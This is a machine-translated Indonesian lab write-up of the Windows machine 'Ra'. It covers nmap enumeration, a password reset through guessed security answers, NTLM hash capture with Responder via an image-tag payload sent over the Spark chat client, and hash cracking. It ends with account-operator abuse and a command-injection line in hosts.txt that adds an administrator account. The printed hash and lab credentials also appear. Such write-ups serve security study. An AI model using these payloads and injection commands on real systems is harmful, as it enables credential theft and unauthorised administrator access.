---
title: "Ra"
description: "Enum Nmap : Port 80 Dirsearch : tidak ada yang menarik, mari kita jelajahi yang lain. daftarkan target ke DNS local kita reload the page and visit reset password feature. in reset"
lang: "id"
translationKey: "ra"
category: "lab-writeups"
tags: ["Lab", "Spark App", "Crack NTLMV2-Hash", "Uncommon-directory", "reset password", "get ntlm hash with responder", "Windows", "Hard"]
publishDate: "2025-02-12"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "1985fca1-ed80-80e8-af1c-f4d59dc5bf7c"
notionUrl: "https://app.notion.com/p/Ra-1985fca1ed8080e8af1cf4d59dc5bf7c"
notionLastEdited: "2025-10-13T16:07:00.000Z"
---

# Enum

Nmap:

```bash
PORT      STATE SERVICE             VERSION
53/tcp    open  domain              Simple DNS Plus
80/tcp    open  http                Microsoft IIS httpd 10.0
|_http-title: Windcorp.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2025-02-12 08:19:46Z)
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| tls-alpn: 
|_  http/1.1
|_http-title: Site doesn't have a title.
|_ssl-date: 2025-02-12T08:21:53+00:00; 0s from scanner time.
| http-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|_  Product_Version: 10.0.17763
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=Windows Admin Center
| Subject Alternative Name: DNS:WIN-2FAA40QQ70B
| Not valid before: 2020-04-30T14:41:03
|_Not valid after:  2020-06-30T14:41:02
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
2179/tcp  open  vmrdp?
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server       Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2025-02-12T08:21:13+00:00
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Not valid before: 2025-02-11T07:54:38
|_Not valid after:  2025-08-13T07:54:38
|_ssl-date: 2025-02-12T08:21:53+00:00; 0s from scanner time.
5222/tcp  open  jabber
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     stream_id: a7q6ps2vum
|     unknown: 
|     auth_mechanisms: 
|     compression_methods: 
|     features: 
|     xmpp: 
|_      version: 1.0
|_ssl-date: 2025-02-12T08:21:57+00:00; 0s from scanner time.
5223/tcp  open  ssl/jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       (timeout)
|     xmpp: 
|     unknown: 
|     auth_mechanisms: 
|     features: 
|_    compression_methods: 
|_ssl-date: 2025-02-12T08:21:54+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5229/tcp  open  jaxflow?
5262/tcp  open  jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     stream_id: 7f7f8ssb73
|     unknown: 
|     auth_mechanisms: 
|     compression_methods: 
|     features: 
|     xmpp: 
|_      version: 1.0
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5263/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       (timeout)
|     xmpp: 
|     unknown: 
|     auth_mechanisms: 
|     features: 
|_    compression_methods: 
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_ssl-date: 2025-02-12T08:21:54+00:00; 0s from scanner time.
5269/tcp  open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       (timeout)
|     xmpp: 
|     unknown: 
|     auth_mechanisms: 
|     features: 
|_    compression_methods: 
5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
|_ssl-date: 2025-02-12T08:21:53+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
5275/tcp  open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     stream_id: afldtdd9tj
|     unknown: 
|     auth_mechanisms: 
|     compression_methods: 
|     features: 
|     xmpp: 
|_      version: 1.0
5276/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       (timeout)
|     xmpp: 
|     unknown: 
|     auth_mechanisms: 
|     features: 
|_    compression_methods: 
|_ssl-date: 2025-02-12T08:21:54+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7070/tcp  open  http                Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_http-title: Openfire HTTP Binding Service
|_http-server-header: Jetty(9.4.18.v20190429)
7777/tcp  open  socks5              (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp  open  zeus-admin?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 12 Feb 2025 08:19:52 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 12 Feb 2025 08:20:01 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp  open  ssl/xmltec-xmlmail?
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 12 Feb 2025 08:20:15 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 12 Feb 2025 08:20:16 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 400 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
9389/tcp  open  mc-nmf              .NET Message Framing
49667/tcp open  msrpc               Microsoft Windows RPC
49672/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc               Microsoft Windows RPC
49674/tcp open  msrpc               Microsoft Windows RPC
49695/tcp open  msrpc               Microsoft Windows RPC
49896/tcp open  msrpc               Microsoft Windows RPC
```

## Pelabuhan 80

![](/images/ra/1997493f3359.png)

Dirsearch :

![](/images/ra/c6d5d6504cd1.png)

![](/images/ra/386757264de6.png)

Tidak ada yang menarik, mari kita jelajahi yang lain.

daftarkan target ke DNS lokal kita

![](/images/ra/cd524fdca1de.png)

Muat ulang halaman dan kunjungi fitur atur ulang kata sandi.

![](/images/ra/a5c44a040904.png)

Pada fitur pengaturan ulang kata sandi, kami menemukan bahwa kami dapat mengatur ulang kata sandi pengguna dengan pertanyaan keamanan berikut.

![](/images/ra/507381bf6a1b.png)

Dari gambar ini kita mendapatkan informasi bahwa orang dalam gambar ini bernama Lilyle dan anjingnya bernama Sparky. Mari kita gunakan informasi tersebut untuk mengatur ulang kata sandi.

![](/images/ra/fc7ec86840a0.png)

![](/images/ra/07df7558cd38.png)

![](/images/ra/913a97015865.png)

Yey, kita berhasil mengatur ulang kata sandi, jadi sekarang mari kita coba masuk ke port 443 menggunakan kredensial `lilyle : ChangeMe#1234`

## Pelabuhan 443

Otentikasi Dasar:

![](/images/ra/0d07d7bfe6f0.png)

Masuk menggunakan kredensial yang telah kita dapatkan pada langkah sebelumnya di port 80.

![](/images/ra/bc17158300e8.png)

![](/images/ra/87838ea10fbe.png)

Setelah itu, saya bingung harus berbuat apa karena saya tidak bisa melakukan apa pun, jadi saya masuk ke port RDP menggunakan kredensial yang sama (`lilyle : ChangeMe#1234`).

## Port 3389 - RDP

![](/images/ra/4e483e54efe4.png)

![](/images/ra/0531c5d2d053.png)

Oke, mungkin pengguna yang kita miliki tidak memiliki akses ke pengguna jarak jauh atau grup pengguna jarak jauh, jadi mari kita pindah ke port lain, port berikutnya adalah SMB.

## Port 139 - SMB

```javascript
smbclient -L //10.10.48.112/ -U lilyle%ChangeMe#1234
```

![](/images/ra/782cf01865ef.png)

Mari kita periksa folder **Bersama**

![](/images/ra/92e72f208388.png)

Yey, kita dapat bendera pertama.

![](/images/ra/9ccca9686c5e.png)

# Manfaatkan Aplikasi Spark

Dari enumerasi share SMB, kita melihat bahwa masih ada sisa file instalasi aplikasi Spark versi 2.8.3. Jadi, saya mencari exploit terkait aplikasi versi tersebut di Google.

![](/images/ra/ec9873e4e68d.png)

Referensi : [https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md](https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md)

![](/images/ra/c43be383cce8.png)

Ini juga mencakup file deb, dmg, exe, dan tar.gz untuk sesuatu yang disebut ‘Spark 2.8.3’. Halaman web yang kita salah gunakan sebelumnya untuk mengatur ulang kata sandi memiliki daftar nama karyawan dan indikator status online. Ini pasti petunjuk untuk menginstal Spark, mencoba mengirim pesan kepada mereka, dan melihat apa yang terjadi.

Saya sudah mengunduh file *.deb tetapi tidak bisa menjalankannya. Setelah membuang terlalu banyak waktu, akhirnya saya menyadari bahwa saya bisa mengambil salinan terbaru yang berfungsi dari [sini](https://www.igniterealtime.org/downloads/).

![](/images/ra/e7b9d9207390.png)

![](/images/ra/2929cfc53888.png)

Setelah instalasi berhasil, mari kita login dengan cara ini:

Login:

- Nama pengguna: lilyle
- Kata sandi: ChangeMe#1234
- Domain: Windcorp.thm
Jika Anda mendapatkan kesalahan terkait sertifikat server, masuklah ke Pengaturan Lanjutan dan hilangkan centang pada opsi pemeriksaan sertifikat.

![](/images/ra/3c7f36450ae2.png)

Setelah berhasil login, untuk dapat menangkap hash NTLM, kita perlu mengobrol dengan pengguna yang sedang online. Dari gambar di bawah ini, kita tahu bahwa hanya pengguna "Buse Candan" yang sedang online.

![](/images/ra/9087c156833b.png)

Oke, pertama-tama mari kita jalankan responder untuk mendengarkan dan menangkap hash NTLM.

```bash
sudo responder -I tun0 -v
```

```bash
sudo responder -I tun0 -v
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.17.49.139]
    Responder IPv6             [fe80::9ca5:a1ed:b959:fe6]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-D8YCO2YK6LQ]
    Responder Domain Name      [R26R.LOCAL]
    Responder DCE-RPC Port     [45945]

[+] Listening for events...   
```

Kemudian, kirim payload seperti ini ke pengguna lain:

```bash
<img src="http://10.17.49.139/test.jpg">
```

![](/images/ra/23ef6ce0b377.png)

Sekarang kita sudah mendapatkan hash NTLM dan sekarang kita coba memecahkannya menggunakan John.

```bash
buse::WINDCORP:1825f72b90cfda87:A3683695C81CAA2D49F92D23E9F97E02:01010000000000008A034EB9237EDB01302003EC5A43D920000000000200080036004A004E00590001001E00570049004E002D00420056004A00570057004F0051003800380044004A000400140036004A004E0059002E004C004F00430041004C0003003400570049004E002D00420056004A00570057004F0051003800380044004A002E0036004A004E0059002E004C004F00430041004C000500140036004A004E0059002E004C004F00430041004C0008003000300000000000000001000000002000004D484E32CDD11B68A23E5D8A31495E2E535A90ADC6A7F7AC8ADD14376C222E020A00100000000000000000000000000000000000090000000000000000000000
```

![](/images/ra/e386b31adc15.png)

```bash
buse : uzunLM+3131 #new credentials
```

# Pijakan Awal

Oke, mari kita gunakan kredensial untuk masuk melalui evil-winrm.

![](/images/ra/5b4f6259b533.png)

Yey, kita dapat flag2.txt kedua.

![](/images/ra/b93e3eadd0c0.png)

# Winpriv

Saya tidak bisa mengunggah winpeas.exe ke target, sepertinya mesin tersebut mengaktifkan antivirus sehingga ketika saya mengunggah sesuatu, file tersebut akan langsung terhapus. Saya harus melakukannya secara manual, setelah berputar-putar saya menemukan direktori yang menarik.

![](/images/ra/4c17e2eff90e.png)

dan berisi 2 file

![](/images/ra/1795ec92a626.png)

Saat saya mencetak output dari log.txt, saya mendapatkan sesuatu yang menarik, yaitu informasi bahwa ada skrip yang berjalan di latar belakang setiap menit.

![](/images/ra/52f137367dc7.png)


Ketika saya membuka skrip `checkservers.ps1`, saya menemukan bahwa skrip tersebut menghasilkan output ke dalam file `log.txt`.

```powershell
# reset the lists of hosts prior to looping
$OutageHosts = $Null
# specify the time you want email notifications resent for hosts that are down
$EmailTimeOut = 30
# specify the time you want to cycle through your host lists.
$SleepTimeOut = 45
# specify the maximum hosts that can be down before the script is aborted
$MaxOutageCount = 10
# specify who gets notified
$notificationto = "brittanycr@windcorp.thm"
# specify where the notifications come from
$notificationfrom = "admin@windcorp.thm"
# specify the SMTP server
$smtpserver = "relay.windcorp.thm"

# start looping here
Do{
$available = $Null
$notavailable = $Null
Write-Host (Get-Date)

# Read the File with the Hosts every cycle, this way to can add/remove hosts
# from the list without touching the script/scheduled task,
# also hash/comment (#) out any hosts that are going for maintenance or are down.
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
ForEach-Object {
    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
    Invoke-Expression $p
if($p)
    {
     # if the Host is available then just write it to the screen
     write-host "Available host ---> "$_ -BackgroundColor Green -ForegroundColor White
     [Array]$available += $_
    }
else
    {
     # If the host is unavailable, give a warning to screen
     write-host "Unavailable host ------------> "$_ -BackgroundColor Magenta -ForegroundColor White
     $p = Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue
     if(!($p))
       {
        # If the host is still unavailable for 4 full pings, write error and send email
        write-host "Unavailable host ------------> "$_ -BackgroundColor Red -ForegroundColor White
        [Array]$notavailable += $_

        if ($OutageHosts -ne $Null)
            {
                if (!$OutageHosts.ContainsKey($_))
                {
                 # First time down add to the list and send email
                 Write-Host "$_ Is not in the OutageHosts list, first time down"
                 $OutageHosts.Add($_,(get-date))
                 $Now = Get-date
                 $Body = "$_ has not responded for 5 pings at $Now"
                 Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
                  -Subject "Host $_ is down" -SmtpServer $smtpserver
                }
                else
                {
                    # If the host is in the list do nothing for 1 hour and then remove from the list.
                    Write-Host "$_ Is in the OutageHosts list"
                    if (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes -gt $EmailTimeOut)
                    {$OutageHosts.Remove($_)}
                }
            }
        else
            {
                # First time down create the list and send email
                Write-Host "Adding $_ to OutageHosts."
                $OutageHosts = @{$_=(get-date)}
                $Body = "$_ has not responded for 5 pings at $Now"
                Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
                 -Subject "Host $_ is down" -SmtpServer $smtpserver
            }
       }
    }
}
# Report to screen the details
$log = "Last run: $(Get-Date)"
write-host $log
Set-Content -Path C:\scripts\log.txt -Value $log
Write-Host "Available count:"$available.count
Write-Host "Not available count:"$notavailable.count
Write-Host "Not available hosts:"
$OutageHosts
Write-Host ""
Write-Host "Sleeping $SleepTimeOut seconds"
sleep $SleepTimeOut
if ($OutageHosts.Count -gt $MaxOutageCount)
{
    # If there are more than a certain number of host down in an hour abort the script.
    $Exit = $True
    $body = $OutageHosts | Out-String
    Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
     -Subject "More than $MaxOutageCount Hosts down, monitoring aborted" -SmtpServer $smtpServer
}
}
while ($Exit -ne $True)
```

Setelah menganalisis skrip, kami mengidentifikasi dua pengguna: brittanycr dan admin. Skrip kemudian mencoba mengambil konten dan mengeksekusi perintah dari `C:\Users\brittanycr\hosts.txt`. Jadi ketika saya memeriksa izin skrip, kami menemukan bahwa yang memiliki akses penuh pada skrip adalah pengguna admin atau pengguna sistem, jadi kami berasumsi skrip dijalankan oleh pengguna administrator.

![](/images/ra/25d65cabd1bb.png)

Untuk mendapatkan akses administrator, kita perlu menyisipkan perintah berbahaya, seperti menambahkan pengguna baru dengan hak akses administrator. Namun, sebelum melanjutkan, kita harus terlebih dahulu masuk sebagai pengguna **brittanycr**, karena pengguna kita saat ini, **buse**, tidak memiliki izin yang diperlukan untuk mengakses file **hosts.txt**. Oleh karena itu, kita perlu menemukan cara untuk menyuntikkan perintah kita ke dalam file **hosts.txt** yang terletak di folder **brittanycr**, di mana kita tidak memiliki izin. Setelah disuntikkan, perintah-perintah ini akan dieksekusi dengan hak akses **administrator**. Setelah melakukan beberapa enumerasi, saya menemukan bahwa akun kita adalah bagian dari grup **Account Operators**.

[https://angelica.gitbook.io/hacktricks/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges](https://angelica.gitbook.io/hacktricks/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)

![](/images/ra/392e5485b463.png)

```text
The Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers.

Source: Microsoft Docs
```

dan hal ini diperkuat oleh hasil uji anjing pelacak berikut.

![](/images/ra/0e6bac92bb90.png)

![](/images/ra/80305020a202.png)

![](/images/ra/187e54fcb6e4.png)

```javascript
#Import Module
Import-Module Powerview.ps1
# running command
Get-DomainObject -Identity 'CN=BUSE CANDAN,OU=IT,DC=WINDCORP,DC=THM' | Get-ObjectAcl -ResolveGUIDs | Format-List
```

![](/images/ra/32d28de0cb5d.png)

Dari gambar diagram, kita menemukan bahwa pengguna kita (buse) memiliki akses atau menjadi anggota grup IT, yang juga berarti buse adalah anggota operasi akun. Oke, sekarang mari kita ubah kata sandi untuk **brittanycr**.

![](/images/ra/7409a56e5876.png)

lalu coba masuk sebagai bruttanycr

![](/images/ra/4a308d5ff429.png)

Saya berhasil mengubah kata sandi, tetapi saya tidak memiliki akses winrm ke perangkat tersebut. Jadi, saya mencoba masuk ke smb menggunakan kredensial yang baru saja kami perbarui.

![](/images/ra/cf500f630aa7.png)

![](/images/ra/bb36e8073c52.png)

Lalu dia pergi ke direktori berandanya dan melihat file hosts.txt.

![](/images/ra/28de319c1328.png)

![](/images/ra/09ca05627649.png)

Saya memperbarui isi file **hosts.txt** dengan perintah untuk membuat pengguna baru **tryhackme** dan menambahkannya ke grup **Administrator**. Langkah pertama, saya memasang folder bersama.

![](/images/ra/b3050ab4e6d8.png)

```powershell
# perintah menambahkan user harus berformat seperti berikut, jk tidak tidak akan bekerja
; net user tryhackme ChangeMe@1234 /add;net localgroup Administrators tryhackme /add
```

![](/images/ra/2fef82c4bfe2.png)

yey pengguna baru berhasil ditambahkan, lalu kita login menggunakan pengguna tersebut

![](/images/ra/20aa95c859bf.png)

akses bendera terakhir.

![](/images/ra/eb23e001fdad.png)

# Administrator Domain yang Tidak Disengaja

# Referensi:

- [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5&viewFallbackFrom=powershell-7.2](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5&viewFallbackFrom=powershell-7.2)
-
